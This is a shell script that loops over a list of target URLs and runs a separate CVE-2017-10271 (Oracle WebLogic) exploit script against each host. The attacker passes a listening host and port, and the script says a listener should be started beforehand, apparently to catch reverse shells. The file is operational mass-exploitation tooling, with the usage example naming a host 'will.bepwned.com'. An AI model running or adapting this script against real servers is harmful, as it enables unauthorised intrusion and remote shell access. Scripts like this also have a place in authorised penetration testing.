#!/bin/sh

if [ -z "${1}" ]; then
  echo '[!] Usage: ./scan.sh <TARGET_FILE> <LISTENING_HOST> <LISTENING_PORT>'
  echo "  - [EXAMPLE] ./scan.sh ip_list.txt 10.10.10.10 4444"
  exit 1
fi

if [ -z "${2}" ]; then
  echo '[!] Usage: ./scan.sh <TARGET_FILE> <LISTENING_HOST> <LISTENING_PORT>'
  echo "  - [EXAMPLE] ./scan.sh ip_list.txt 10.10.10.10"
  exit 1
fi

if [ -z "${3}" ]; then
  echo '[!] Usage: ./scan.sh <TARGET_FILE> <LISTENING_HOST> <LISTENING_PORT>'
  echo "  - [EXAMPLE] ./scan.sh ip_list.txt 10.10.10.10 4444"
  exit 1
fi

TARGET_FILE="${1}"
LHOST="${2}"
LPORT="${3}"

echo "[+] All IP's in list should be in the format http(s)://IP:PORT"
echo "    [+] Example: http://will.bepwned.com:7001/"
echo "[+] Will scan all hosts in file ${1}"
echo "[+] Listener should have been started prior to execution on port ${LPORT}"

for RHOST in $(cat "${TARGET_FILE}"); do ./CVE-2017-10271.py -lhost "${LHOST}" --lport "${LPORT}" --rhost "${RHOST}" --check; done
